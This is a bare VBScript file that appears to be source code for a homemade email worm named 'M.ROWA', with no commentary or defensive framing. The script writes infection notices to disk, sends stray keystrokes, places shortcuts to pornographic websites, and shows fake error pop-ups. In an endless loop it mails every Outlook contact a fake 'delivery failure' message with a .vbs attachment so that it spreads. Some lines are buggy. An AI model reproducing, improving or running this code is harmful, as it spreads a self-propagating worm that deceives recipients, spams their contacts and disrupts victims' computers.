
dim a,b,mrowa,virus,f,fso,m,n,o,p
set shell=CreateObject("WScript.Shell")
set a=CreateObject("Scripting.FileSystemObject")
set virus=a.CreateTextFile("C:\virus.txt")
virus.WriteLine"YOU HAVE BEEN INFECTED BY THE M.ROWA WORM"
virus.Close
set b=CreateObject("Scripting.FileSystemObject")
set mrowa=b.CreateTextFile("C:\mrowa.txt")
mrowa.WriteLine"YOU HAVE BEEN INFECTED BY THE M.ROWA WORM"
mrowa.close
shell.SendKeys "{A}"
shell.SendKeys "{DEL}"
shell.SendKeys "{ENTER}"
shell.SendKeys "{A}"
shell.SendKeys "{DEL}"
shell.SendKeys "{ENTER}"
shell.SendKeys "{B}"
shell.SendKeys "{DEL}"
shell.SendKeys "{ENTER}"
wscript.sleep 2000
Set f = a.CreateFolder("MROWA")
CreateFolderDemo = f.Path
Set oShellLink = shell.CreateShortcut("Notepad.lnk")
oShellLink.TargetPath = "notepad.exe"
oShellLink.Save
Set p = shell.CreateShortcut("Internet.lnk")
p.TargetPath = "iexplore.exe"
p.Save
Set m = shell.CreateShortcut("pornsite.url")
m.TargetPath = "http://www.porn.com"
m.Save
Set n = shell.CreateShortcut("pornsite2.url")
n.TargetPath = "http://www.cumshot.com"
n.Save
Set o = shell.CreateShortcut("pornsite3.url")
o.TargetPath = "http://www.porno.com"
o.Save
shell.SendKeys "{F}"
shell.SendKeys "{DEL}"
shell.SendKeys "{ENTER}"
shell.SendKeys "{G}"
shell.SendKeys "{DEL}"
shell.SendKeys "{ENTER}"
shell.SendKeys "{H}"
shell.SendKeys "{DEL}"
shell.SendKeys "{ENTER}"
wscript.sleep 2000
msgbox "ERROR",vbCritical,"ERROR"
msgbox "YOU HAVE BEEN INFECTED BY THE M.ROWA WORM",vbCritical,"WORM WARNING"
do
shell.SendKeys "{NUMLOCK}"
shell.SendKeys "{CAPSLOCK}"
wscript.sleep 1000
Set So = CreateObject(fso)
Set ol = CreateObject("Outlook.Application")
Set out = Wscript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For X = 1 To a.AddressEntries.Count
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Msn Email Failure"
Mail.Body = "Hi the email you have sent has not been delivered.The copy of your email has been atached to this email.Please read."
Mail.Attachments.Add = "*.vbs"
Mail.Send
Next
ol.Quit
shell.SendKeys "{SCROLLLOCK}"
loop
